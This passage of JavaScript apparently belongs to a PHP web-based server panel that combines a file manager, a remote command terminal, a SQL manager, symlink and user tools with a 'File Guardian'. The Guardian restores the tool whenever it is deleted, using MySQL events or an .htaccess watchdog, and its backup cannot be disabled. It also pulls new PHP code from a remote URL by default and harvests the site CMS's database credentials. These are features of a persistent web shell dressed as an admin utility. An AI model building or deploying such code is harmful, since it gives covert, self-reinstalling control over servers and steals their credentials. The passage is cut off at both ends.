          <button class="btn ${d.active?'btn-s':'btn-p'}" id="cmsMaintOn" style="flex:1" ${d.active?'disabled':''}>Turn Maintenance Mode ON</button>
          <button class="btn ${d.active?'btn-p':'btn-s'}" id="cmsMaintOff" style="flex:1" ${d.active?'':'disabled'}>Turn Maintenance Mode OFF</button>
        </div>
        <div style="margin-top:14px;font-size:11px;color:var(--t3);line-height:1.5">You (logged in as a site admin) can still browse the live site and its admin panel while this is on — only signed-out visitors see the maintenance message.</div>
      </div>`;
    el.querySelector('.cms-back-btn')?.addEventListener('click',cmsShowPicker);
    cmsBindTabs();
    async function cmsMaintAction(enable){
      const msg=document.getElementById('cmsMaintMsg').value.trim();
      const fd=new FormData();
      fd.append('csrf_token',CSRF);fd.append('action','cms_maintenance_toggle');fd.append('config_path_b64',cmsB64(cmsCurrentCfg));
      fd.append('enable',enable);fd.append('message',msg);
      await fetch('',{method:'POST',body:fd});
    }
    document.getElementById('cmsMaintOn').addEventListener('click',async()=>{await cmsMaintAction('1');toast('Maintenance mode enabled.');loadCmsMaintenance();});
    document.getElementById('cmsMaintOff').addEventListener('click',async()=>{await cmsMaintAction('0');toast('Maintenance mode disabled.');loadCmsMaintenance();});
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed: '+esc(String(e))+'</div>';}
}

/* ═══════════════════════════════════════
   NETWORK SPEED TEST (ping / download / upload)
═══════════════════════════════════════ */
document.getElementById('speedBtn')?.addEventListener('click',()=>openMod('speedOv'));
document.getElementById('speedClose')?.addEventListener('click',()=>closeMod('speedOv'));
document.getElementById('spRun')?.addEventListener('click',async()=>{
  const btn=document.getElementById('spRun'),st=document.getElementById('spStatus');
  btn.disabled=true;document.getElementById('spPing').textContent='-';document.getElementById('spDown').textContent='-';document.getElementById('spUp').textContent='-';
  st.textContent='Testing the server\'s connection to the internet… this runs entirely on the server.';
  try{
    const d=await fetch('?x=speedtest_server&r='+Math.random(),{cache:'no-store'}).then(r=>r.json());
    document.getElementById('spPing').textContent=(d.ping_ms!=null?d.ping_ms+' ms':'-');
    document.getElementById('spDown').textContent=(d.download_mbps!=null?d.download_mbps+' Mbps':'-');
    document.getElementById('spUp').textContent=(d.upload_mbps!=null?d.upload_mbps+' Mbps':'-');
    st.textContent=d.error?d.error:'Done — measured on the server, not your device.';
  }catch{st.textContent='Test failed. The server could not be reached or the request errored.';}
  btn.disabled=false;
});

/* ═══════════════════════════════════════
   BATCH RENAME MODAL
═══════════════════════════════════════ */
document.getElementById('brBtn')?.addEventListener('click',()=>{
  const s=selNames();
  if(!s.length){toast('Select files first!');return;}
  document.getElementById('brItems').value=JSON.stringify(s);
  openMod('brOv');
});
document.getElementById('brClose')?.addEventListener('click',()=>closeMod('brOv'));

/* SYMLINK */
document.getElementById('symlinkBtn')?.addEventListener('click',()=>openMod('symlinkOv'));
document.getElementById('symlinkClose')?.addEventListener('click',()=>closeMod('symlinkOv'));

/* USERS */
document.getElementById('usersBtn')?.addEventListener('click',()=>openMod('usersOv'));
document.getElementById('usersClose')?.addEventListener('click',()=>closeMod('usersOv'));

/* ═══════════════════════════════════════
   PERMISSIONS MODAL
═══════════════════════════════════════ */
const permChecks=Array.from(document.querySelectorAll('.perm-ck'));
const permOctal=document.getElementById('permOctal');
function permFromOctal(oct){
  const digits=(oct||'').padStart(3,'0').slice(-3).split('').map(Number);
  const bits=[256,128,64,32,16,8,4,2,1];
  permChecks.forEach(cb=>{cb.checked=false;});
  let i=0;
  [digits[0],digits[1],digits[2]].forEach((d,gi)=>{
    if(d&4)permChecks[gi*3+0].checked=true;
    if(d&2)permChecks[gi*3+1].checked=true;
    if(d&1)permChecks[gi*3+2].checked=true;
  });
}
function permToOctal(){
  let o=[0,0,0];
  permChecks.forEach((cb,i)=>{if(cb.checked){const grp=Math.floor(i/3);const bitVal=[4,2,1][i%3];o[grp]+=bitVal;}});
  return o.join('');
}
permChecks.forEach(cb=>cb.addEventListener('change',()=>{permOctal.value=permToOctal();}));
permOctal?.addEventListener('input',()=>{if(/^[0-7]{3,4}$/.test(permOctal.value))permFromOctal(permOctal.value);});
function openPerm(name,perm){
  document.getElementById('permTitle').textContent='Permissions - '+name;
  document.getElementById('permName').value=name;
  const oct=(perm||'0644').slice(-3);
  permOctal.value=oct;permFromOctal(oct);
  openMod('permOv');
}
document.getElementById('permClose')?.addEventListener('click',()=>closeMod('permOv'));

/* ═══════════════════════════════════════
   SHARE LINKS
═══════════════════════════════════════ */
function openShareCreate(name){
  document.getElementById('shareCreateTitle').textContent='Share Link - '+name;
  document.getElementById('shareItemName').value=name;
  openMod('shareCreateOv');
}
document.getElementById('shareCreateClose')?.addEventListener('click',()=>closeMod('shareCreateOv'));
document.getElementById('sharesBtn')?.addEventListener('click',()=>openMod('sharesOv'));
document.getElementById('sharesClose')?.addEventListener('click',()=>closeMod('sharesOv'));
document.querySelectorAll('.share-copy-btn').forEach(b=>b.addEventListener('click',()=>{
  navigator.clipboard.writeText(b.dataset.url).then(()=>toast('Share link copied!'));
}));

/* ═══════════════════════════════════════
   FOLDER SIZE CALCULATOR
═══════════════════════════════════════ */
async function calcDirSize(name,trigger){
  const btns=trigger?[trigger]:Array.from(document.querySelectorAll('.dsz-btn')).filter(b=>b.dataset.n===name);
  btns.forEach(b=>{b.disabled=true;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='…';});
  try{
    const d=await fetch('?x=dirsize&f='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
    if(d.error){toast('Could not calculate size.');btns.forEach(b=>{b.disabled=false;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='Size';});return;}
    const txt=formatBytes(d.size)+(d.capped?'+':'')+' · '+d.files+' files';
    btns.forEach(b=>{
      const span=document.createElement('span');span.className='sz';span.textContent=txt;
      b.replaceWith(span);
    });
    toast(`"${name}": ${formatBytes(d.size)}${d.capped?' (partial, still large)':''} - ${d.files} files, ${d.dirs} folders`,4000);
  }catch{toast('Could not calculate size.');btns.forEach(b=>{b.disabled=false;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='Size';});}
}
document.querySelectorAll('.dsz-btn').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();calcDirSize(b.dataset.n,b);}));

/* ═══════════════════════════════════════
   TERMINAL
═══════════════════════════════════════ */
const termInp=document.getElementById('termInp');
const termOut=document.getElementById('termOut');
const termWin=document.getElementById('termWin');
const termSug=document.getElementById('termSug');
const termCpuGraph=document.getElementById('termCpuGraph');
const termCpuCtx=termCpuGraph?.getContext('2d');
let termCpuData=Array(50).fill(0);
let termSystemInfoReady=false,termSystemInfoBusy=false;
const termHist=[];let hIdx=-1,sugIdx=-1,sugList=[];

document.getElementById('termBtn')?.addEventListener('click',()=>{
  const terminalUrl=new URL(window.location.href);
  terminalUrl.searchParams.set('terminal','1');
  terminalUrl.searchParams.delete('x');
  terminalUrl.searchParams.delete('raw');
  window.open(terminalUrl.toString(),'_blank','noopener,noreferrer');
});
document.getElementById('termClose')?.addEventListener('click',()=>closeMod('termOv'));
if(document.body.classList.contains('term-standalone'))setTimeout(()=>termInp?.focus(),80);
termWin?.addEventListener('click',e=>{
  if(!e.target.closest('.term-suggest'))termInp?.focus();
});

if(termInp){
  termInp.addEventListener('keydown',async e=>{
    if(e.key==='Enter'){hideSug();await runTerm();return;}
    if(e.key==='ArrowUp'){e.preventDefault();if(hIdx<termHist.length-1){hIdx++;termInp.value=termHist[termHist.length-1-hIdx]||'';}adjustTermInputWidth();return;}
    if(e.key==='ArrowDown'){e.preventDefault();if(hIdx>0){hIdx--;termInp.value=termHist[termHist.length-1-hIdx]||'';}else{hIdx=-1;termInp.value='';}adjustTermInputWidth();return;}
    if(e.key==='Tab'){e.preventDefault();if(sugList.length>0){sugIdx=(sugIdx+1)%sugList.length;termInp.value=getTermBase()+sugList[sugIdx];adjustTermInputWidth();}else await fetchSug();return;}
    if(e.key==='Escape'){hideSug();return;}
    if(e.ctrlKey&&e.key==='c'){e.preventDefault();termInp.value='';adjustTermInputWidth();appendLine('^C','cmd-line');return;}
    if(e.key.length===1)setTimeout(()=>fetchSug(),50);
  });
  termInp.addEventListener('input',()=>{adjustTermInputWidth();fetchSug();});
}

function adjustTermInputWidth(){
  if(termInp)termInp.style.width=(termInp.value.length||0.1)+'ch';
}
adjustTermInputWidth();

function termUptime(seconds){
  seconds=Math.max(0,Number(seconds)||0);
  const days=Math.floor(seconds/86400),hours=Math.floor((seconds%86400)/3600),minutes=Math.floor((seconds%3600)/60),secs=Math.floor(seconds%60);
  if(days>0)return days+'d '+hours+'h';
  if(hours>0)return hours+'h '+minutes+'m';
  if(minutes>0)return minutes+'m '+secs+'s';
  return secs+'s';
}
function drawTermCpu(){
  if(!termCpuCtx||!termCpuGraph)return;
  const w=termCpuGraph.width,h=termCpuGraph.height;
  termCpuCtx.clearRect(0,0,w,h);termCpuCtx.beginPath();termCpuCtx.moveTo(0,h);
  termCpuData.forEach((v,i)=>termCpuCtx.lineTo(i*(w/(termCpuData.length-1)),h-(v/100*h)));
  termCpuCtx.lineTo(w,h);termCpuCtx.closePath();termCpuCtx.fillStyle='#027c05';termCpuCtx.fill();
}
async function refreshTermSystemInfo(){
  if(termSystemInfoBusy)return;
  termSystemInfoBusy=true;
  const set=(id,value)=>{const el=document.getElementById(id);if(el)el.textContent=String(value);};
  // Keep the footer useful even if a hosting environment blocks the stats request.
  if(!termSystemInfoReady){
    set('termHost',location.host||'localhost');
    set('termIp','IP: '+(location.hostname||'—'));
    set('termCpu','0%');
    set('termRam','0 B / 0 B');
    set('termDisk','0 B / 0 B');
    set('termUptime','0s');
    set('termProc','—');
    set('termTime',new Date().toLocaleTimeString('en-GB',{hour12:false}));
    set('termHostname',location.hostname||'server');
  }
  try{
    const d=await fetch('?x=svlite').then(r=>r.json());
    const cores=Math.max(1,Number(d.cpu_cores)||1),load=Array.isArray(d.load)?Number(d.load[0])||0:0;
    const cpu=Math.min(100,Math.round(load/cores*1000)/10);
    termCpuData.shift();termCpuData.push(cpu);drawTermCpu();
    set('termHost',location.host||'localhost');
    set('termIp','IP: '+(d.server_ip||location.hostname||'—'));
    set('termCpu',cpu+'%');
    set('termRam',formatBytes(d.mem_used||0)+' / '+formatBytes(d.mem_total||0));
    set('termDisk',formatBytes(d.disk_used||0)+' / '+formatBytes(d.disk_total||0));
    set('termUptime',termUptime(d.uptime));
    set('termProc',String(d.processes??'—'));
    set('termTime',new Date().toLocaleTimeString('en-GB',{hour12:false}));
    set('termHostname',d.hostname||'server');
    termSystemInfoReady=true;
  }catch{}finally{termSystemInfoBusy=false;}
}
if(document.getElementById('termWin')){
  refreshTermSystemInfo();
  setInterval(refreshTermSystemInfo,2000);
}

function getTermBase(){const v=termInp.value;const sp=v.lastIndexOf(' ');return sp>=0?v.slice(0,sp+1):'';}
function updateTermPrompt(prompt,cwd){
  if(cwd)termCwd=cwd;
  const el=document.querySelector('.term-dollar');
  if(el&&prompt)el.textContent=':'+prompt+'$ ';
}
async function fetchSug(){
  const v=termInp?.value||'';const last=v.split(' ').pop();
  if(!last){hideSug();return;}
  try{const r=await fetch('?x=ac&prefix='+encodeURIComponent(last)).then(r=>r.json());
    sugList=r;sugIdx=-1;
    if(r.length>0){if(!termSug)return;termSug.innerHTML=r.map((x,i)=>`<div class="term-sug-item" data-i="${i}">${esc(x)}</div>`).join('');termSug.style.display='block';
      termSug.querySelectorAll('.term-sug-item').forEach(el=>el.addEventListener('mousedown',ev=>{ev.preventDefault();termInp.value=getTermBase()+el.textContent;hideSug();termInp.focus();}));
    }else hideSug();
  }catch{hideSug();}
}
function hideSug(){if(termSug)termSug.style.display='none';sugList=[];sugIdx=-1;}

async function runTerm(){
  const cmd=termInp?.value.trim();if(!cmd||!termInp)return;
  termHist.push(cmd);hIdx=-1;termInp.value='';adjustTermInputWidth();
  const promptText=(document.querySelector('.term-ps')?.textContent||'$').trim();
  appendLine(promptText+' '+cmd,'cmd-line');
  if(cmd==='clear'||cmd==='cls'){if(termOut)termOut.innerHTML='';return;}
  const btnR=document.getElementById('termWin');
  try{
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('qi',cmd);
    const d=await fetch('?x=run',{method:'POST',body:fd}).then(r=>r.json());
    if(d.error){appendLine('Error: '+d.error,'err-line');}
    else{
      updateTermPrompt(d.prompt,d.cwd);
      if(d.output){d.output.replace(/\r/g,'').split('\n').forEach(line=>appendLine(line,d.exit===0?'ok-line':'err-line'));}
    }
  }catch(err){appendLine('Request failed: '+err.message,'err-line');}
  if(termWin)termWin.scrollTop=termWin.scrollHeight;
}
function appendLine(text,cls){
  if(!termOut)return;
  const s=document.createElement('span');
  s.className='term-line'+(cls?' '+cls:'');
  s.textContent=text;
  termOut.appendChild(s);
  if(termWin)termWin.scrollTop=termWin.scrollHeight;
}

/* ═══════════════════════════════════════
   EDITOR SHORTCUTS
═══════════════════════════════════════ */
const codeTA=document.querySelector('textarea.code');
if(codeTA){
  const edLines=document.getElementById('edLines'),edDirty=document.getElementById('edDirty'),edForm=codeTA.closest('form'),initialCode=codeTA.value;
  const syncLines=()=>{if(edLines){const n=codeTA.value.split('\n').length;edLines.textContent=Array.from({length:n},(_,i)=>i+1).join('\n');edLines.scrollTop=codeTA.scrollTop;}};
  const markDirty=()=>{if(edDirty)edDirty.classList.toggle('show',codeTA.value!==initialCode);};
  codeTA.addEventListener('input',()=>{syncLines();markDirty();});
  codeTA.addEventListener('scroll',()=>{if(edLines)edLines.scrollTop=codeTA.scrollTop;});
  syncLines();
  codeTA.addEventListener('keydown',e=>{
    if(e.key==='Tab'){e.preventDefault();const s=codeTA.selectionStart,en=codeTA.selectionEnd;codeTA.value=codeTA.value.slice(0,s)+'    '+codeTA.value.slice(en);codeTA.selectionStart=codeTA.selectionEnd=s+4;}
    if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();codeTA.closest('form').submit();}
  });
  document.getElementById('edFindNext')?.addEventListener('click',()=>{
    const q=document.getElementById('edFind')?.value;if(!q)return;
    const start=codeTA.selectionEnd,at=codeTA.value.indexOf(q,start);
    const pos=at<0?codeTA.value.indexOf(q):at;
    if(pos<0){toast('Text not found.');return;}codeTA.focus();codeTA.setSelectionRange(pos,pos+q.length);
  });
  document.getElementById('edReplaceOne')?.addEventListener('click',()=>{
    const q=document.getElementById('edFind')?.value;if(!q)return;const r=document.getElementById('edReplace')?.value||'';
    if(codeTA.value.slice(codeTA.selectionStart,codeTA.selectionEnd)===q){codeTA.setRangeText(r);syncLines();markDirty();}
    else document.getElementById('edFindNext')?.click();
  });
  document.getElementById('edReplaceAll')?.addEventListener('click',()=>{
    const q=document.getElementById('edFind')?.value;if(!q)return;const r=document.getElementById('edReplace')?.value||'';
    const count=(codeTA.value.match(new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'g'))||[]).length;
    if(count){codeTA.value=codeTA.value.split(q).join(r);syncLines();markDirty();toast(`${count} replacement(s) made.`);}else toast('Text not found.');
  });
  document.getElementById('edFormatJson')?.addEventListener('click',()=>{
    try{codeTA.value=JSON.stringify(JSON.parse(codeTA.value),null,2);syncLines();markDirty();toast('JSON formatted.');}
    catch{toast('The current file is not valid JSON.');}
  });
  window.addEventListener('beforeunload',e=>{if(codeTA.value!==initialCode){e.preventDefault();e.returnValue='';}});
}

/* ═══════════════════════════════════════
   ALERTS
═══════════════════════════════════════ */
document.querySelectorAll('.alert-x').forEach(btn=>{
  btn.addEventListener('click',()=>{
    const a=btn.closest('.alert');
    a.style.transition='opacity .2s,transform .2s';a.style.opacity='0';a.style.transform='translateY(-6px)';
    setTimeout(()=>a.remove(),220);
  });
});

/* ═══════════════════════════════════════
   DRAG & DROP UPLOAD
═══════════════════════════════════════ */
function uploadWithProgress(files){
  if(!files||!files.length)return;
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','upload');
  for(const f of files)fd.append('file[]',f);
  const bar=document.createElement('div');
  bar.style.cssText='position:fixed;left:50%;bottom:calc(var(--bh,26px) + 12px);transform:translateX(-50%);background:var(--raised);border:1px solid var(--border2);color:var(--t1);padding:10px 18px;border-radius:10px;font-size:12.5px;font-weight:500;z-index:9999;min-width:240px;box-shadow:0 8px 32px rgba(0,0,0,.5)';
  bar.innerHTML='<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Uploading…</span><span id="upSpeedTxt">0 MB/s</span></div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden"><div id="upSpeedBar" style="height:100%;width:0%;background:#85898C;transition:width .1s"></div></div>';
  document.body.appendChild(bar);
  const xhr=new XMLHttpRequest();
  let lastT=performance.now(),lastLoaded=0;
  xhr.upload.addEventListener('progress',e=>{
    if(!e.lengthComputable)return;
    const now=performance.now(),dt=(now-lastT)/1000;
    if(dt>0.15){
      const speed=((e.loaded-lastLoaded)/dt)/1048576;
      document.getElementById('upSpeedTxt').textContent=speed.toFixed(1)+' MB/s';
      lastT=now;lastLoaded=e.loaded;
    }
    const pct=Math.round(e.loaded/e.total*100);
    document.getElementById('upSpeedBar').style.width=pct+'%';
  });
  xhr.addEventListener('loadend',()=>{bar.remove();location.reload();});
  xhr.addEventListener('error',()=>{bar.remove();toast('Upload failed.');});
  xhr.open('POST',location.href);
  xhr.send(fd);
}
const dz=document.getElementById('dropzone');
if(dz){
  ['dragenter','dragover'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();e.stopPropagation();dz.classList.add('drag-over');}));
  ['dragleave','drop'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();e.stopPropagation();if(ev==='dragleave'&&e.target!==dz)return;dz.classList.remove('drag-over');}));
  dz.addEventListener('drop',e=>{uploadWithProgress(e.dataTransfer.files);});
}
const upFileInp=document.getElementById('upFile');
if(upFileInp){
  upFileInp.removeAttribute('onchange');
  upFileInp.addEventListener('change',()=>uploadWithProgress(upFileInp.files));
}

/* ═══════════════════════════════════════
   RIPPLE
═══════════════════════════════════════ */
document.querySelectorAll('.btn,.sb-item,.sb-flink,.sh-btn').forEach(el=>{
  el.addEventListener('pointerdown',function(e){
    const r=document.createElement('span');
    r.style.cssText=`position:absolute;border-radius:50%;width:6px;height:6px;background:rgba(255,255,255,.22);transform:scale(0);animation:rip .5s cubic-bezier(.25,.46,.45,.94) forwards;pointer-events:none;left:${e.offsetX-3}px;top:${e.offsetY-3}px;`;
    if(getComputedStyle(this).position==='static')this.style.position='relative';
    this.style.overflow='hidden';this.appendChild(r);setTimeout(()=>r.remove(),520);
  });
});
const rs=document.createElement('style');rs.textContent='@keyframes rip{to{transform:scale(28);opacity:0}}';document.head.appendChild(rs);

/* ═══════════════════════════════════════
   TOAST NOTIFICATION
═══════════════════════════════════════ */
function toast(msg,dur=2000){
  const el=document.createElement('div');
  el.style.cssText='position:fixed;bottom:calc(var(--bh,26px) + 12px);left:50%;transform:translate(-50%,0);background:var(--raised);border:1px solid var(--border2);color:var(--t1);padding:8px 16px;border-radius:10px;font-size:13px;font-weight:500;z-index:9999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.5);animation:fadeUp .25s cubic-bezier(.34,1.56,.64,1) both';
  el.textContent=msg;document.body.appendChild(el);
  setTimeout(()=>{el.style.opacity='0';el.style.transform='translate(-50%,8px)';el.style.transition='.2s';setTimeout(()=>el.remove(),220);},dur);
}


/* ═══════════════════════════════════════
   SQL DATABASE MANAGER
═══════════════════════════════════════ */
let sqlCreds={host:'localhost',port:3306,user:'',pass:'',db:'',driver:'mysql'};
let sqlCurrentTable='';let sqlCurrentPage=1;
function sqlPost(op,extra){
  const fd=new FormData();fd.append('csrf_token',CSRF);
  fd.append('sql_host',sqlCreds.host);fd.append('sql_port',sqlCreds.port);
  fd.append('sql_user',sqlCreds.user);fd.append('sql_pass',sqlCreds.pass);
  fd.append('sql_db',sqlCreds.db);
  fd.append('sql_driver',sqlCreds.driver||'mysql');
  if(extra)for(const k in extra)fd.append(k,extra[k]);
  return fetch('?x='+op,{method:'POST',body:fd}).then(r=>r.json());
}
function sqlOpenQuery(){
  document.getElementById('sqlQTitle').textContent='SQL Query — '+sqlCreds.db;
  document.getElementById('sqlQDbLabel').textContent=sqlCreds.db+' @ '+sqlCreds.host;
  openMod('sqlQueryOv');
}
document.getElementById('sqlBtn')?.addEventListener('click',()=>{openMod('sqlOv');sqlShowPicker();});
document.getElementById('sqlClose')?.addEventListener('click',()=>closeMod('sqlOv'));

/* ═══════════════════════════════════════
   FILE GUARDIAN PANEL
═══════════════════════════════════════ */
function guardFmt(ts){return ts?new Date(ts*1000).toLocaleString():'—';}
async function guardLoad(){
  const el=document.getElementById('guardBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const s=await fetch('?x=guardian_status').then(r=>r.json());
    if(s.error){el.innerHTML='<div style="padding:20px;color:#fca5a5">'+esc(s.error)+'</div>';return;}
    el.innerHTML=`
      <div style="padding:16px">
        <div style="font-size:11.5px;color:var(--t3);line-height:1.5;margin-bottom:16px">
          Guardian keeps a backup copy of this exact tool in a small database it controls, so it can restore itself if it's ever deleted by accident. It never runs remote code — it only ever restores this tool's own file, or applies a new version from a URL you set below.
        </div>
        <div class="info-g" style="grid-template-columns:1fr 1fr">
          <div class="info-c"><div class="info-cl">Database</div><div class="info-cv">${s.db_connected?'<span style="color:var(--green)">Connected</span>':'<span style="color:var(--red)">Not reachable</span>'}</div><div class="info-cs">${esc(s.db_user)}@${esc(s.db_host)}:${s.db_port}/${esc(s.db_name)}</div></div>
          <div class="info-c"><div class="info-cl">Backup installed</div><div class="info-cv">${s.installed?'<span style="color:var(--green)">Yes</span>':'<span style="color:var(--amber)">Not yet</span>'}</div><div class="info-cs">${guardFmt(s.installed_at)}</div></div>
          <div class="info-c"><div class="info-cl">Last synced</div><div class="info-cv">${guardFmt(s.updated_at)}</div><div class="info-cs">hash ${esc(s.content_hash||'—')}</div></div>
          <div class="info-c"><div class="info-cl">Auto-restore-when-deleted</div><div class="info-cv">${s.autoheal_active?(s.autoheal_event?'<span style="color:var(--green)">Active (MySQL event)</span>':'<span style="color:var(--green)">Active (web-server watchdog)</span>'):'<span style="color:var(--t3)">Unavailable on this server</span>'}</div><div class="info-cs">${esc(s.autoheal_note||'Needs MySQL EVENT + FILE privileges, or a web server that allows .htaccess overrides')}</div></div>
        </div>
        ${!s.db_connected?`
        <div style="margin-top:14px;padding:12px;border:1px solid var(--red);border-radius:8px;background:rgba(248,113,113,.08)">
          <div style="font-size:11.5px;color:#fca5a5;line-height:1.5;margin-bottom:10px">${esc(s.diagnosis||'The Guardian database is not reachable.')}</div>
          <div style="font-size:11px;color:var(--t3);margin-bottom:10px">This site's own CMS (WordPress/Joomla/etc.) already has a working database login — try that first, with zero typing, before falling back to a separate admin account.</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
            <button class="btn btn-g" id="guardAutodiscoverBtn">Auto-detect existing site database</button>
            <button class="btn btn-g" id="guardAutocreateBtn">Create a new database automatically</button>
          </div>
          <div style="font-size:11px;color:var(--t3);margin-bottom:8px">Or paste a MySQL login that already works on this server (e.g. your hosting's DB admin/root account). It's used once — right now, in this request — to create Guardian's own database and low-privilege user, then never stored anywhere.</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <input class="inp" id="guardAdminUser" placeholder="admin DB username" style="flex:1;min-width:140px">
            <input class="inp" type="password" id="guardAdminPass" placeholder="admin DB password" style="flex:1;min-width:140px">
            <button class="btn btn-p" id="guardProvisionBtn">Auto-create database &amp; user</button>
          </div>
        </div>`:''}
        <div class="field" style="margin-top:16px"><label>Update URL (raw .php link)</label><input class="inp" id="guardUrl" placeholder="https://example.com/path/to/latest.php" value="${esc(s.update_url||'')}"></div>
        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;color:var(--t2);margin:10px 0"><input type="checkbox" id="guardUpdatePaused" ${s.update_paused?'checked':''}> Pause automatic update checks (backup/restore always stays active and can't be turned off; auto-update is ON by default and resumes as soon as you uncheck this)</label>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
          <button class="btn btn-p" id="guardSaveBtn">Save</button>
          <button class="btn btn-g" id="guardCheckBtn">Check Updates Now</button>
          <button class="btn btn-g" id="guardSyncBtn">Sync Backup Now</button>
        </div>
        <div id="guardMsg" style="font-size:11.5px;margin-top:10px;color:var(--t3)"></div>
      </div>`;
    document.getElementById('guardSaveBtn').addEventListener('click',guardSave);
    document.getElementById('guardCheckBtn').addEventListener('click',guardCheckNow);
    document.getElementById('guardSyncBtn').addEventListener('click',guardSyncNow);
    document.getElementById('guardProvisionBtn')?.addEventListener('click',guardProvisionNow);
    document.getElementById('guardAutodiscoverBtn')?.addEventListener('click',guardAutodiscoverNow);
    document.getElementById('guardAutocreateBtn')?.addEventListener('click',guardAutocreateNow);
    document.getElementById('guardUpdatePaused').addEventListener('change',guardTogglePause);
  }catch{el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load.</div>';}
}
async function guardTogglePause(e){
  const msg=document.getElementById('guardMsg');
  const paused=e.target.checked;
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('paused',paused?'1':'0');
  try{
    const r=await fetch('?x=guardian_pause_update',{method:'POST',body:fd}).then(r=>r.json());
    if(!r.ok){e.target.checked=!paused;msg.style.color='#fca5a5';msg.textContent='Could not change that.';return;}
    msg.style.color='var(--green)';msg.textContent=r.paused?'Automatic update checks paused.':'Automatic update checks resumed.';
  }catch{e.target.checked=!paused;msg.style.color='#fca5a5';msg.textContent='Request failed.';}
}
async function guardAutodiscoverNow(){
  const msg=document.getElementById('guardMsg');
  const btn=document.getElementById('guardAutodiscoverBtn');
  btn.disabled=true;msg.style.color='var(--t3)';msg.textContent='Scanning this server for an existing site database…';
  const fd=new FormData();fd.append('csrf_token',CSRF);
  try{
    const r=await fetch('?x=guardian_autodiscover',{method:'POST',body:fd}).then(r=>r.json());
    if(r.error){btn.disabled=false;msg.style.color='#fca5a5';msg.textContent=r.error;return;}
    if(r.ok){msg.style.color='var(--green)';msg.textContent='Adopted the existing '+(r.adopted?.type||'site')+' database ('+(r.adopted?.db||'')+')'+(r.autoheal_active?' — auto-restore active too.':'.')+' Reloading…';setTimeout(guardLoad,900);}
    else{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Found a database but could not connect to it — try the manual option below.';}
  }catch{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Auto-detect failed.';}
}
async function guardAutocreateNow(){
  const msg=document.getElementById('guardMsg');
  const btn=document.getElementById('guardAutocreateBtn');
  btn.disabled=true;msg.style.color='var(--t3)';msg.textContent='Creating a new, isolated database for Guardian…';
  const fd=new FormData();fd.append('csrf_token',CSRF);
  try{
    const r=await fetch('?x=guardian_autocreate',{method:'POST',body:fd}).then(r=>r.json());
    if(r.error){btn.disabled=false;msg.style.color='#fca5a5';msg.textContent=r.error;return;}
    if(r.ok){msg.style.color='var(--green)';msg.textContent='New database created and connected'+(r.autoheal_active?' — auto-restore active too.':'.')+' Reloading…';setTimeout(guardLoad,900);}
    else{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Could not create a new database automatically — try the manual admin-login option below.';}
  }catch{btn.disabled=false;msg.style.color='#fca5a5';msg.textContent='Auto-create failed.';}
}
async function guardProvisionNow(){
  const msg=document.getElementById('guardMsg');
  const au=document.getElementById('guardAdminUser').value.trim();
  const ap=document.getElementById('guardAdminPass').value;
  if(!au){msg.style.color='#fca5a5';msg.textContent='Enter the admin DB username first.';return;}
  msg.style.color='var(--t3)';msg.textContent='Creating database, user and grants…';
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('admin_user',au);fd.append('admin_pass',ap);
  try{
    const r=await fetch('?x=guardian_provision',{method:'POST',body:fd}).then(r=>r.json());
    if(r.error){msg.style.color='#fca5a5';msg.textContent=r.error;return;}
    if(r.ok){msg.style.color='var(--green)';msg.textContent='Database connected'+(r.autoheal_active?' — auto-restore active too.':'.')+' Reloading…';setTimeout(guardLoad,900);}
    else{msg.style.color='#fca5a5';msg.textContent='Created the account but still could not connect — check host/port.';}
  }catch{msg.style.color='#fca5a5';msg.textContent='Auto-create failed.';}
}
async function guardSave(){
  const msg=document.getElementById('guardMsg');msg.textContent='Saving…';
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('update_url',document.getElementById('guardUrl').value.trim());
  try{
    const r=await fetch('?x=guardian_save',{method:'POST',body:fd}).then(r=>r.json());
    if(r.error){msg.textContent=r.error;msg.style.color='#fca5a5';return;}
    msg.style.color='var(--green)';msg.textContent='Saved — reloading…';
    setTimeout(()=>location.reload(),900);
  }catch{msg.textContent='Failed to save.';msg.style.color='#fca5a5';}
}
async function guardCheckNow(){
  const msg=document.getElementById('guardMsg');msg.textContent='Checking…';msg.style.color='var(--t3)';
  const fd=new FormData();fd.append('csrf_token',CSRF);
  try{
    const r=await fetch('?x=guardian_check_now',{method:'POST',body:fd}).then(r=>r.json());
    if(r.error){msg.textContent=r.error;msg.style.color='#fca5a5';return;}
    if(r.changed){msg.style.color='var(--green)';msg.textContent='Update applied — reloading…';setTimeout(()=>location.reload(),900);}
    else{msg.style.color='var(--t2)';msg.textContent='Already up to date.';}
  }catch{msg.textContent='Check failed.';msg.style.color='#fca5a5';}
}
async function guardSyncNow(){
  const msg=document.getElementById('guardMsg');msg.textContent='Syncing…';msg.style.color='var(--t3)';
  const fd=new FormData();fd.append('csrf_token',CSRF);
  try{
    const r=await fetch('?x=guardian_sync_now',{method:'POST',body:fd}).then(r=>r.json());
